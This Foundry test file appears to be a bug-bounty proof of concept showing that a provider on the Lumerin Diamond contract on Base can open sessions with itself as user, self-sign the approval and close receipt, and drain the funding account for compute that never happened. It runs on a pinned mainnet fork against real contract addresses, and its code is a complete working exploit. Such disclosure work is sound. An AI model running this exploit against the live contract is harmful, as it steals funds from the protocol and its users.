// SPDX-License-Identifier: MIT
// PoC: Lumerin Diamond (Base) — a provider can bill the protocol's funding
// account for compute that never happened by opening sessions with themselves
// as the user and signing their own provider approval + close receipt.
// Run: forge test --match-contract LumerinSelfDealPoC -vvv
// (the test pins its own fork: Base mainnet block 58516882, RPC
// https://mainnet.base.org, via vm.createSelectFork in setUp).
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

interface ILumerinDiamond {
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(
        address provider_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] calldata tags_
    ) external;
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function getSessionEnd(uint256 amount_, uint256 pricePerSecond_, uint128 openedAt_) external view returns (uint128);
    function stakeToStipend(uint256 amount_, uint128 timestamp_) external view returns (uint256);
    function withdrawUserStakes(address user_, uint8 iterations_) external;
    function getProvidersTotalClaimed() external view returns (uint256);
    function getComputeBalance(uint128 timestamp_) external view returns (uint256);
    function totalMORSupply(uint128 timestamp_) external view returns (uint256);
    function startOfTheDay(uint128 timestamp_) external pure returns (uint128);
}

contract LumerinSelfDealPoC is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address constant FUNDING = 0x5160C0311A95E0A1072FA85Df23712A7BA1cD4b1;

    uint256 constant ATTACKER_PK = 0xA11CE;
    address attacker;

    function setUp() public {
        // Pin the Base mainnet fork to block 58516882 (program requirement:
        // vm.createSelectFork(RPC, BLOCK), one command from a clean clone).
        vm.createSelectFork("https://mainnet.base.org", 58516882);
        attacker = vm.addr(ATTACKER_PK);
        // Give the attacker 1,000,000 MOR (test setup only: simulates a whale).
        deal(MOR, attacker, 1_000_000 ether);
        vm.prank(attacker);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
    }

    function _sign(uint256 pk, bytes memory data) internal pure returns (bytes memory) {
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(keccak256(data));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    function testSelfDealTwoCycles() public {
        uint256 fundingBefore = IERC20(MOR).balanceOf(FUNDING);
        uint256 claimedBefore = ILumerinDiamond(DIAMOND).getProvidersTotalClaimed();
        uint256 attackerBefore = IERC20(MOR).balanceOf(attacker);
        console.log("fundingAccount MOR before:", fundingBefore / 1 ether);
        console.log("providersTotalClaimed before:", claimedBefore / 1 ether);

        // 1) Register as a provider (100,000 MOR stake; minimum is 0.2 MOR).
        vm.prank(attacker);
        ILumerinDiamond(DIAMOND).providerRegister(attacker, 100_000 ether, "https://attacker.example");

        // 2) Register a model (100 MOR stake; minimum is 0.1 MOR).
        bytes32 baseModelId = keccak256("attacker-model");
        string[] memory tags = new string[](1);
        tags[0] = "attack";
        vm.prank(attacker);
        ILumerinDiamond(DIAMOND).modelRegister(attacker, baseModelId, keccak256("ipfs"), 0, 100 ether, "AttackModel", tags);
        bytes32 modelId = ILumerinDiamond(DIAMOND).getModelId(attacker, baseModelId);

        // 3) Post a bid at the maximum price, 0.01 MOR/second.
        vm.prank(attacker);
        bytes32 bidId = ILumerinDiamond(DIAMOND).postModelBid(attacker, modelId, 1e16);

        uint256 totalPaid;
        for (uint256 i = 0; i < 2; i++) {
            // 4) Open a NON-direct session as our own user, signing our own
            //    provider approval. No compute happens anywhere.
            bytes memory approval = abi.encode(bidId, block.chainid, attacker, uint128(block.timestamp));
            bytes memory approvalSig = _sign(ATTACKER_PK, approval);
            vm.prank(attacker);
            bytes32 sessionId = ILumerinDiamond(DIAMOND).openSession(attacker, 100_000 ether, false, approval, approvalSig);

            uint128 openedAt = uint128(block.timestamp);
            uint128 endsAt = ILumerinDiamond(DIAMOND).getSessionEnd(100_000 ether, 1e16, openedAt);
            console.log("cycle duration (s):", uint256(endsAt - openedAt));

            // 5) Fast-forward to the session end, then close with a self-signed
            //    receipt claiming arbitrary throughput (tps/ttft are never verified).
            vm.warp(endsAt);
            bytes memory receipt = abi.encode(sessionId, block.chainid, uint128(block.timestamp), uint32(1000), uint32(100));
            bytes memory receiptSig = _sign(ATTACKER_PK, receipt);

            uint256 fundingBeforeCycle = IERC20(MOR).balanceOf(FUNDING);
            uint256 attackerBeforeCycle = IERC20(MOR).balanceOf(attacker);
            vm.prank(attacker);
            ILumerinDiamond(DIAMOND).closeSession(receipt, receiptSig);
            uint256 paid = fundingBeforeCycle - IERC20(MOR).balanceOf(FUNDING);
            uint256 gained = IERC20(MOR).balanceOf(attacker) - attackerBeforeCycle;
            console.log("provider payment (MOR):", paid / 1 ether);
            console.log("attacker gain (MOR):", gained / 1 ether);
            // The attacker's balance also grows by the part of their session
            // stake refunded immediately on close, so the funding-account
            // delta (the drain) is the number that matters here.
            assertGt(paid, 0, "provider must be paid from the funding account");
            totalPaid += paid;

            // 6) Recover the locked session stake once its release time passes.
            uint128 releaseAt = ILumerinDiamond(DIAMOND).startOfTheDay(endsAt) + 1 days;
            vm.warp(releaseAt + 1);
            vm.prank(attacker);
            ILumerinDiamond(DIAMOND).withdrawUserStakes(attacker, 10);
        }

        uint256 fundingAfter = IERC20(MOR).balanceOf(FUNDING);
        uint256 claimedAfter = ILumerinDiamond(DIAMOND).getProvidersTotalClaimed();
        uint256 attackerAfter = IERC20(MOR).balanceOf(attacker);

        console.log("total drained from fundingAccount (MOR):", totalPaid / 1 ether);
        console.log("fundingAccount MOR after:", fundingAfter / 1 ether);
        console.log("attacker MOR after (stakes still in diamond):", attackerAfter / 1 ether);

        assertEq(fundingBefore - fundingAfter, totalPaid, "funding account lost exactly what the attacker gained");
        assertEq(claimedAfter - claimedBefore, totalPaid, "providersTotalClaimed grew by the same amount");
        // Attacker spent 100,000 (provider stake) + 100 (model stake) + 0.3 (bid fee)
        // and got back the two 100,000 MOR session stakes + the provider payments.
        assertEq(
            attackerAfter,
            attackerBefore - 100_000 ether - 100 ether - 0.3 ether + totalPaid,
            "attacker kept the payments; only the stakes and the 0.3 MOR fee are in the diamond"
        );
    }
}
